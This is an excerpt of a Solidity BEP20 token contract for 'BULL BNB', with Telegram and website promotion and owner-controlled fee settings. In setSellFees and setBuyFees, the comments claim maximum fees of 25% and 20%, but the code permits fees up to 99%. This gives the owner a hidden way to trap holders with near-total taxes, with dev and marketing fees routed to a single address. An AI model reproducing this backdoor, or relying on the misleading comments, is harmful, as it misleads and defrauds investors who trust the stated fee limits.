...
/*
    ...
    Total Tax Buy/Sell      : 10%
            Rewards(BUSD)   : 4%
            Marketing       : 4%
            Auto Liquidity  : 2%

    Telegram    : https://t.me/BullBNBOfficial
    Website     : https://bull-bnb.yolasite.com/
*/
 ...
 */
contract BULLBNB is IBEP20, Ownable {
    ...
    // Basic Contract Info
    string constant _name = "BULL BNB";
    ...
    uint256 public _maxSellAmount = _totalSupply / 100 * 2;
    ...
    address private devFeeReceiver = 0xa8EF45166Cf5aA6ff25eCA1Ba1d7a1dbd36297E1;
    address private marketingFeeReceiver = 0xa8EF45166Cf5aA6ff25eCA1Ba1d7a1dbd36297E1;
    ...
    function _distributeBNB(uint256 amountBNB) private {
        ...
        try distributor.deposit{value: BNBRewards}() {} catch {} // Swap rewards BNB to RWRD
    ...
    function setSellFees(uint256 marketing, uint256 dev, uint256 rewards, uint256 liquidity) external onlyOwner { // Owner can set sell fees - Maximum allowed is 25%
        ...
        require(marketing + dev + rewards + liquidity <= 99, "Cannot set Sell Fees higher than 99%");
    ...
    function setBuyFees(uint256 marketing, uint256 dev, uint256 rewards, uint256 liquidity) external onlyOwner { // Owner can set buy fees - Maximum allowed is 20%
        require(_tradingEnabled,"Trading not enabled");
        require(marketing + dev + rewards + liquidity <= 99, "Cannot set Buy Fees higher than 99%");
